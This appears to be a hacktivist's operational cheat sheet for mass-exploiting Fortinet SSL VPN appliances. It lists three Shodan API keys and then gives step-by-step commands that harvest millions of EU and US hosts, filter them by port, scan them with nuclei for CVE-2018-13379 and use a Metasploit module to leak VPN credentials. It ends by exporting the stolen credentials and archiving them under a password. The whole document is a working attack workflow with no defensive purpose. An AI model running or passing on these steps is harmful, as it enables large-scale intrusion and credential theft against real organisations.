


```
shodan init kNWoMbgDfszHJqH95uAe0lelO4AsQIim
shodan init QPWbPNV5UODo5TMNvUdFpXEiSG8DbnWm
shodan init IYbvYxdkAlQCMNqaOirU7JYU9hsQVHlm
```

https://enlacehacktivista.org/index.php?title=VPN_brute_forcing

---

Collect targets **(make sure the "country:" command is typed right in the terminal*)
 
```
shodan download --limit 5000000 fortinet_eu.json.gz fortinet
country:"AT","BE","BG","CY","CZ","DE","DK","EE","ES","FI","FR","GR","HR","HU","IE","IT","LT","LU","LV","MT","NL","PL","PT","RO","SE","SI"

shodan download --limit 5000000 fortinet_us.json.gz fortinet country:"US"
```

Parse into .txt files
```
shodan parse fortinet_eu.json.gz --fields=ip_str,port > fortinet_eu.txt
shodan parse fortinet_us.json.gz --fields=ip_str,port > fortinet_us.txt
```

Sort by number of ports 
```
awk '{count[$2]++} END {for (port in count) print count[port], "occurrences - Port", port}' fortinet_eu.txt | sort -rn

awk '{count[$2]++} END {for (port in count) print count[port], "occurrences - Port", port}' fortinet_us.txt | sort -rn
```

Filter by port
```
grep -E '\s10443$' fortinet_eu.txt | awk '{print $1}' > 10443_eu.txt
grep -E '\s10443$' fortinet_us.txt | awk '{print $1}' > 10443_us.txt
```

Combine into one file
```
cat 10443_eu.txt 10443_us.txt > 10443.txt
```

Scan for vulnerabilities
```
nuclei -l 10443.txt -t ~/nuclei-templates -id CVE-2018-13379 -o vulnerable_10443.txt
```

---
#### Metasploit

```
sudo service postgresql start

msfdb init sudo

use auxiliary/gather/fortios_vpnssl_traversal_creds_leak

set RHOSTS file:targets.txt

run

creds
```

- Export the credentials
  
```
creds -o fortinet-vpn-credentials.csv
```
---
#### Zipping & Password Protecting

```
7z a fortinet-vpn-creds.7z file.xml -px5qSXju-)Db4`K_(wtGE2B
```
